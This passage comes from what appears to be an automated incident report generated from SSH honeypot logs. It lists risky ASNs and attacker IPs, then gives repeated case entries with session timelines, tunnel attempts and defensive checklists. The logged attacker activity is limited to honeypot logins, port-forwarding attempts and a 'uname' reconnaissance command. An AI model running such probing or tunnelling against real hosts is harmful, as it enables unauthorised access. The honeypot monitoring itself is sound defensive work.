Source IPs: `20.96.179.87`, `15.235.192.186`, `107.150.103.210`, `50.116.72.11`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **69** |
| Unique ASNs | **46** |
| High-Risk ASNs | **44** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8473` | Bahnhof AB | 4 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS58224` | Iran Telecommunication Company PJS | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS31898` | Oracle Corporation | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (319)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a05119ff7a00

| Field | Detail |
|---|---|
| **Source IP** | `182.95.190[.]150` |
| **First Seen** | 2026-08-24 00:56 |
| **Last Seen** | 2026-08-24 00:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 00:56:15` | `cowrie.session.connect` |
| `2026-08-24 00:56:16` | `cowrie.client.version` |
| `2026-08-24 00:56:16` | `cowrie.client.kex` |
| `2026-08-24 00:56:18` | `cowrie.login.success` |
| `2026-08-24 00:56:18` | `cowrie.direct-tcpip.request` |
| `2026-08-24 00:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.95.190[.]150` to AbuseIPDB if not already reported
- [ ] Block `182.95.190[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f3b7b3b246c

| Field | Detail |
|---|---|
| **Source IP** | `118.45.113[.]140` |
| **First Seen** | 2026-08-24 00:56 |
| **Last Seen** | 2026-08-24 00:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 00:56:23` | `cowrie.session.connect` |
| `2026-08-24 00:56:24` | `cowrie.client.version` |
| `2026-08-24 00:56:24` | `cowrie.client.kex` |
| `2026-08-24 00:56:27` | `cowrie.login.success` |
| `2026-08-24 00:56:28` | `cowrie.direct-tcpip.request` |
| `2026-08-24 00:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.45.113[.]140` to AbuseIPDB if not already reported
- [ ] Block `118.45.113[.]140` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25708d00f845

| Field | Detail |
|---|---|
| **Source IP** | `27.39.130[.]144` |
| **First Seen** | 2026-08-24 00:58 |
| **Last Seen** | 2026-08-24 00:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 00:58:56` | `cowrie.session.connect` |
| `2026-08-24 00:58:57` | `cowrie.client.version` |
| `2026-08-24 00:58:57` | `cowrie.client.kex` |
| `2026-08-24 00:58:59` | `cowrie.login.success` |
| `2026-08-24 00:59:00` | `cowrie.direct-tcpip.request` |
| `2026-08-24 00:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.39.130[.]144` to AbuseIPDB if not already reported
- [ ] Block `27.39.130[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc3599e0c93f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:02 |
| **Last Seen** | 2026-08-24 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:02:38` | `cowrie.session.connect` |
| `2026-08-24 01:02:38` | `cowrie.client.version` |
| `2026-08-24 01:02:38` | `cowrie.client.kex` |
| `2026-08-24 01:02:39` | `cowrie.login.success` |
| `2026-08-24 01:02:39` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:02:39` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:02:39` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:02:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f07761443817

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:02 |
| **Last Seen** | 2026-08-24 01:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:02:42` | `cowrie.session.connect` |
| `2026-08-24 01:02:42` | `cowrie.client.version` |
| `2026-08-24 01:02:42` | `cowrie.client.kex` |
| `2026-08-24 01:02:43` | `cowrie.login.success` |
| `2026-08-24 01:02:43` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:02:43` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:02:43` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:02:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bdc64230b23

| Field | Detail |
|---|---|
| **Source IP** | `122.187.147[.]13` |
| **First Seen** | 2026-08-24 01:04 |
| **Last Seen** | 2026-08-24 01:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:04:02` | `cowrie.session.connect` |
| `2026-08-24 01:04:02` | `cowrie.client.version` |
| `2026-08-24 01:04:02` | `cowrie.client.kex` |
| `2026-08-24 01:04:05` | `cowrie.login.success` |
| `2026-08-24 01:04:06` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:04:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.147[.]13` to AbuseIPDB if not already reported
- [ ] Block `122.187.147[.]13` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f706b2a81df8

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-24 01:04 |
| **Last Seen** | 2026-08-24 01:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:04:11` | `cowrie.session.connect` |
| `2026-08-24 01:04:12` | `cowrie.client.version` |
| `2026-08-24 01:04:12` | `cowrie.client.kex` |
| `2026-08-24 01:04:14` | `cowrie.login.success` |
| `2026-08-24 01:04:14` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:04:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9935a3e4705

| Field | Detail |
|---|---|
| **Source IP** | `128.185.12[.]179` |
| **First Seen** | 2026-08-24 01:07 |
| **Last Seen** | 2026-08-24 01:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:07:27` | `cowrie.session.connect` |
| `2026-08-24 01:07:28` | `cowrie.client.version` |
| `2026-08-24 01:07:28` | `cowrie.client.kex` |
| `2026-08-24 01:07:30` | `cowrie.login.success` |
| `2026-08-24 01:07:31` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.185.12[.]179` to AbuseIPDB if not already reported
- [ ] Block `128.185.12[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44a2bfc9e3ab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.211[.]46` |
| **First Seen** | 2026-08-24 01:07 |
| **Last Seen** | 2026-08-24 01:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:07:34` | `cowrie.session.connect` |
| `2026-08-24 01:07:35` | `cowrie.client.version` |
| `2026-08-24 01:07:35` | `cowrie.client.kex` |
| `2026-08-24 01:07:36` | `cowrie.login.success` |
| `2026-08-24 01:07:36` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.211[.]46` to AbuseIPDB if not already reported
- [ ] Block `91.92.211[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b79d7154a15b

| Field | Detail |
|---|---|
| **Source IP** | `46.210.94[.]61` |
| **First Seen** | 2026-08-24 01:07 |
| **Last Seen** | 2026-08-24 01:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:07:36` | `cowrie.session.connect` |
| `2026-08-24 01:07:37` | `cowrie.client.version` |
| `2026-08-24 01:07:37` | `cowrie.client.kex` |
| `2026-08-24 01:07:38` | `cowrie.login.success` |
| `2026-08-24 01:07:39` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.210.94[.]61` to AbuseIPDB if not already reported
- [ ] Block `46.210.94[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a69d461ac1e2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-24 01:09 |
| **Last Seen** | 2026-08-24 01:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:09:08` | `cowrie.session.connect` |
| `2026-08-24 01:09:08` | `cowrie.client.version` |
| `2026-08-24 01:09:08` | `cowrie.client.kex` |
| `2026-08-24 01:09:08` | `cowrie.login.success` |
| `2026-08-24 01:09:08` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:09:09` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7e0ef19be9d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:12 |
| **Last Seen** | 2026-08-24 01:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:12:08` | `cowrie.session.connect` |
| `2026-08-24 01:12:08` | `cowrie.client.version` |
| `2026-08-24 01:12:08` | `cowrie.client.kex` |
| `2026-08-24 01:12:09` | `cowrie.login.success` |
| `2026-08-24 01:12:09` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:12:09` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:12:09` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c95db73f422b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 01:12 |
| **Last Seen** | 2026-08-24 01:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:12:12` | `cowrie.session.connect` |
| `2026-08-24 01:12:12` | `cowrie.client.version` |
| `2026-08-24 01:12:12` | `cowrie.client.kex` |
| `2026-08-24 01:12:13` | `cowrie.login.success` |
| `2026-08-24 01:12:13` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:12:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 01:12:13` | `cowrie.direct-tcpip.data` |
| `2026-08-24 01:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8d1545e7ae7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:06` | `cowrie.session.connect` |
| `2026-08-24 01:13:06` | `cowrie.client.version` |
| `2026-08-24 01:13:06` | `cowrie.client.kex` |
| `2026-08-24 01:13:06` | `cowrie.login.success` |
| `2026-08-24 01:13:07` | `cowrie.session.params` |
| `2026-08-24 01:13:07` | `cowrie.command.input` |
| `2026-08-24 01:13:07` | `cowrie.log.closed` |
| `2026-08-24 01:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1583ab8c23ed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:12` | `cowrie.session.connect` |
| `2026-08-24 01:13:12` | `cowrie.client.version` |
| `2026-08-24 01:13:12` | `cowrie.client.kex` |
| `2026-08-24 01:13:12` | `cowrie.login.success` |
| `2026-08-24 01:13:13` | `cowrie.session.params` |
| `2026-08-24 01:13:13` | `cowrie.command.input` |
| `2026-08-24 01:13:13` | `cowrie.log.closed` |
| `2026-08-24 01:13:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7417b60296ac

| Field | Detail |
|---|---|
| **Source IP** | `117.211.77[.]86` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:15` | `cowrie.session.connect` |
| `2026-08-24 01:13:16` | `cowrie.client.version` |
| `2026-08-24 01:13:16` | `cowrie.client.kex` |
| `2026-08-24 01:13:18` | `cowrie.login.success` |
| `2026-08-24 01:13:19` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.77[.]86` to AbuseIPDB if not already reported
- [ ] Block `117.211.77[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0679ac3d931e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:17` | `cowrie.session.connect` |
| `2026-08-24 01:13:17` | `cowrie.client.version` |
| `2026-08-24 01:13:17` | `cowrie.client.kex` |
| `2026-08-24 01:13:18` | `cowrie.login.success` |
| `2026-08-24 01:13:18` | `cowrie.session.params` |
| `2026-08-24 01:13:18` | `cowrie.command.input` |
| `2026-08-24 01:13:19` | `cowrie.log.closed` |
| `2026-08-24 01:13:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6314a7a56b7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:22` | `cowrie.session.connect` |
| `2026-08-24 01:13:22` | `cowrie.client.version` |
| `2026-08-24 01:13:22` | `cowrie.client.kex` |
| `2026-08-24 01:13:23` | `cowrie.login.success` |
| `2026-08-24 01:13:24` | `cowrie.session.params` |
| `2026-08-24 01:13:24` | `cowrie.command.input` |
| `2026-08-24 01:13:24` | `cowrie.log.closed` |
| `2026-08-24 01:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d241c3e6a31

| Field | Detail |
|---|---|
| **Source IP** | `217.24.185[.]98` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:24` | `cowrie.session.connect` |
| `2026-08-24 01:13:25` | `cowrie.client.version` |
| `2026-08-24 01:13:25` | `cowrie.client.kex` |
| `2026-08-24 01:13:26` | `cowrie.login.success` |
| `2026-08-24 01:13:26` | `cowrie.direct-tcpip.request` |
| `2026-08-24 01:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.24.185[.]98` to AbuseIPDB if not already reported
- [ ] Block `217.24.185[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0c420d1e84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:27` | `cowrie.session.connect` |
| `2026-08-24 01:13:27` | `cowrie.client.version` |
| `2026-08-24 01:13:28` | `cowrie.client.kex` |
| `2026-08-24 01:13:28` | `cowrie.login.success` |
| `2026-08-24 01:13:28` | `cowrie.session.params` |
| `2026-08-24 01:13:28` | `cowrie.command.input` |
| `2026-08-24 01:13:29` | `cowrie.log.closed` |
| `2026-08-24 01:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f3729b2395

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:33` | `cowrie.session.connect` |
| `2026-08-24 01:13:33` | `cowrie.client.version` |
| `2026-08-24 01:13:33` | `cowrie.client.kex` |
| `2026-08-24 01:13:33` | `cowrie.login.success` |
| `2026-08-24 01:13:34` | `cowrie.session.params` |
| `2026-08-24 01:13:34` | `cowrie.command.input` |
| `2026-08-24 01:13:34` | `cowrie.log.closed` |
| `2026-08-24 01:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75b1d0f2bcf7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:38` | `cowrie.session.connect` |
| `2026-08-24 01:13:38` | `cowrie.client.version` |
| `2026-08-24 01:13:38` | `cowrie.client.kex` |
| `2026-08-24 01:13:38` | `cowrie.login.success` |
| `2026-08-24 01:13:39` | `cowrie.session.params` |
| `2026-08-24 01:13:39` | `cowrie.command.input` |
| `2026-08-24 01:13:39` | `cowrie.log.closed` |
| `2026-08-24 01:13:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e8b5b50beb7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:43` | `cowrie.session.connect` |
| `2026-08-24 01:13:43` | `cowrie.client.version` |
| `2026-08-24 01:13:43` | `cowrie.client.kex` |
| `2026-08-24 01:13:44` | `cowrie.login.success` |
| `2026-08-24 01:13:45` | `cowrie.session.params` |
| `2026-08-24 01:13:45` | `cowrie.command.input` |
| `2026-08-24 01:13:45` | `cowrie.log.closed` |
| `2026-08-24 01:13:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b5c2580d06

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:48` | `cowrie.session.connect` |
| `2026-08-24 01:13:48` | `cowrie.client.version` |
| `2026-08-24 01:13:48` | `cowrie.client.kex` |
| `2026-08-24 01:13:49` | `cowrie.login.success` |
| `2026-08-24 01:13:50` | `cowrie.session.params` |
| `2026-08-24 01:13:50` | `cowrie.command.input` |
| `2026-08-24 01:13:50` | `cowrie.log.closed` |
| `2026-08-24 01:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39e62dc9b704

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:13 |
